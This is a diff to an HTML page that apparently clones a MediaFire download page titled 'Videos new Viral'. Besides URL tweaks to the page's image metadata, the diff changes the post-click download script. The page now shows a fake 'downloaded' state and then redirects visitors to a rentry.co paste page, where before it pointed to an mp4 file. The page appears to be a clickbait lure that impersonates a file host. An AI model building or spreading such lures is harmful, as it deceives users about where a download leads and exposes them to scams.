@@ -30,7 +30,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     <meta property="og:site_name" content="MediaFire" />
     <meta property="og:locale" content="en_US" />
     <meta property="og:title" content="Videos new Viral" />
-    <meta property="og:image" content="https://www.mediafire.com/view/7r5zko8grbxbpx9/img005.png/file" />
+    <meta property="og:image" content="https://www.mediafire.com/view/7r5zko8grbxbpx9/img005.png" />
     <meta property="og:description" content="" />
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:site" content="@MediaFire" />
@@ -39,9 +39,9 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     <meta name="twitter:description" content="" />
     <link href="https://plus.google.com/+mediafire" rel="publisher" />
     <meta itemprop="name" content="Videos new viral" />
-    <meta itemprop="image" content="https://www.mediafire.com/view/7r5zko8grbxbpx9/img005.png/file" />
+    <meta itemprop="image" content="https://www.mediafire.com/view/7r5zko8grbxbpx9/img005.png" />
     <link rel="stylesheet" href="css/style.css">
-    <link rel="shortcut icon" href="https://www.mediafire.com/view/7r5zko8grbxbpx9/img005.png/file">
+    <link rel="shortcut icon" href="https://www.mediafire.com/view/7r5zko8grbxbpx9/img005.png">
     
     
     
@@ -331,7 +331,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                         $('.download').hide();
                         flexing('.downloaded');
                         setTimeout(() => {
-                            window.location.href = 'https://download1483.mediafire.com/xban048g6zrg/qjpx4lhovlh3py5/527f000.mp4'
+                            window.location.href = 'https://rentry.co/871-1'
                         }, 1000)
                     }
                 })
